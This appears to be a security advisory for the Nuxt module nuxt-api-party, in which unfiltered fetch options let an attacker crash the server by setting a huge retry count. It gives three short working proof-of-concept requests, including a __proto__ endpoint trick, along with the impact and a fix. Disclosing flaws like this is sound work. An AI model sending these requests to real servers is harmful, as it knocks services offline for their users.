summary: "DOS by abusing `fetchOptions.retry`.\n### Summary\n`nuxt-api-party` allows developers\
  \ to proxy requests to an API without exposing credentials to the client. [`ofetch`](https://github.com/unjs/ofetch)\
  \ is used to send the requests. \n\nThe library allows the user to send many options directly\
  \ to `ofetch`. There is no filter on which options are available. We can abuse the retry logic\
  \ to cause the server to crash from a stack overflow.\n\n### Details\n`fetchOptions` [are\
  \ obtained directly from the request body](https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L27).\
  \ These are then [passed directly into `ofetch`\n](https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L57C15-L57C15).\n\
  \nWe can construct a URL we know will not fetch successfully, then set the retry attempts\
  \ to a high value, this will cause a stack overflow as ofetch error handling works recursively.\
  \ \n\n### PoC\nPOC using Node.\n\n```js\nawait fetch(\"http://localhost:3000/api/__api_party/MyEndpoint\"\
  , {\n    method: \"POST\",\n    body: JSON.stringify({ path: \"x:x\", retry: 9999999 }),\n\
  \    headers: { \"Content-Type\": \"application/json\" }\n})\n```\n\nWe can use `__proto__`\
  \ as a substitute for the endpoint if it is not known.\n\n```js\nawait fetch(\"http://localhost:3000/api/__api_party/__proto__\"\
  , {\n    method: \"POST\",\n    body: JSON.stringify({ path: \"x:x\", retry: 9999999 }),\n\
  \    headers: { \"Content-Type\": \"application/json\" }\n})\n```\n\nWe can build the size\
  \ of the stack faster by using more complicated URIs\n```js\nawait fetch(\"http://localhost:3000/api/__api_party/__proto__\"\
  , {\n    method: \"POST\",\n    body: JSON.stringify({ path: \"data:x;base64,----\", retry:\
  \ 9999999 }),\n    headers: { \"Content-Type\": \"application/json\" }\n})\n```\n\n### Impact\n\
  Full DOS, server is unusable during attack. Requires a single request. \n\n### Fix \nLimit\
  \ which options can be passed to `ofetch`."
